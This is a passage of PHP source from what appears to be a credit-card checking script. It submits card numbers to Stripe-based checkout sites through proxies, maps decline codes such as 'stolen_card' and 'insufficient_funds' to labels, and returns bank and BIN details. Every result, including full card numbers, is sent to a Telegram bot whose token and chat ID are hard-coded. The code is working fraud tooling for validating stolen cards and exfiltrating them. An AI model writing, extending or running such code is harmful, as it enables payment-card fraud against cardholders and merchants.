    'Brand' => $cc_info['brand'],
    'Type' => $cc_info['type'],
    'Country' => $cc_info['country'],
    'Country_Name' => $cc_info['country_name'],
    'Bank' => $cc_info['bank']
]
];
send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
exit;
}
elseif (isset($r5js->data->receipt->processingError->code)) {
$err = $r5js->data->receipt->processingError->code;

// Map common Stripe error codes to user-friendly messages
$stripeErrorMap = [
    'card_declined' => 'Card Declined',
    'insufficient_funds' => 'Insufficient Funds',
    'incorrect_cvc' => 'Incorrect CVC',
    'expired_card' => 'Expired Card',
    'processing_error' => 'Processing Error',
    'incorrect_number' => 'Incorrect Card Number',
    'invalid_expiry_month' => 'Invalid Expiry Month',
    'invalid_expiry_year' => 'Invalid Expiry Year',
    'invalid_cvc' => 'Invalid CVC',
    'card_not_supported' => 'Card Not Supported',
    'currency_not_supported' => 'Currency Not Supported',
    'duplicate_transaction' => 'Duplicate Transaction',
    'fraudulent' => 'Fraudulent Card',
    'generic_decline' => 'Generic Decline',
    'lost_card' => 'Lost Card',
    'stolen_card' => 'Stolen Card',
    'pickup_card' => 'Pickup Card',
    'restricted_card' => 'Restricted Card',
    'security_violation' => 'Security Violation',
    'service_not_allowed' => 'Service Not Allowed',
    'transaction_not_allowed' => 'Transaction Not Allowed'
];

// Use mapped error or fallback to original
$friendlyErr = $stripeErrorMap[$err] ?? $err;

if ($err == 'incorrect_zip') {
$response_type = $err;
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>INCORRECT ZIP ❌</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> $response_type\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
}
$result = json_encode([
'Response' => $friendlyErr,
'ErrorCode' => $err,
'Price' => $totalamt,
'Gateway' => $gateway,
'cc' => $cc1,
'CC_Info' => [
    'BIN' => $cc_info['bin'],
    'Brand' => $cc_info['brand'],
    'Type' => $cc_info['type'],
    'Country' => $cc_info['country'],
    'Country_Name' => $cc_info['country_name'],
    'Bank' => $cc_info['bank']
]
]);
// Log all other error responses to Telegram
if ($err != 'incorrect_zip') {
    $time_taken = round(microtime(true) - $start_time, 2);
    $log_all = "<b>CC CHECKED</b>\n" .
    "<b>Full Card:</b> <code>$cc1</code>\n" .
    "<pre><b>Site:</b> $checkouturl\n" .
    "<b>Response:</b> $err\n" .
    "<b>Gateway:</b> $gateway\n" .
    "<b>Amount:</b> $totalamt$\n" .
    "<b>Time:</b> {$time_taken}s</pre>";
    send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_all);
}
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
} else {
$err = 'Response Not Found';
$time_taken = round(microtime(true) - $start_time, 2);
$log_message = "<b>Response Not Found ?</b>\n" .
"<b>Full Card:</b> <code>$cc1</code>\n" .
"<pre><b>Site:</b> $checkouturl\n" .
"<b>Response:</b> Unknown/Not Found\n" .
"<b>Gateway:</b> $gateway\n" .
"<b>Amount:</b> $totalamt$\n" .
"<b>Time:</b> {$time_taken}s</pre>";
send_telegram_log("8063859579:AAHiOG2O4oBDJJswouRUScMOZDxGACXigPI", "5652614329", $log_message);
$result_array = [
        'Response' => $err,
        'ProxyStatus' => $proxy_status,
        'ProxyIP' => ($proxy_used ? $proxy_ip : 'N/A')
    ];
    $result = json_encode($result_array);
send_final_response(json_decode($result, true), $proxy_used, $proxy_ip, $proxy_port);
exit;
}

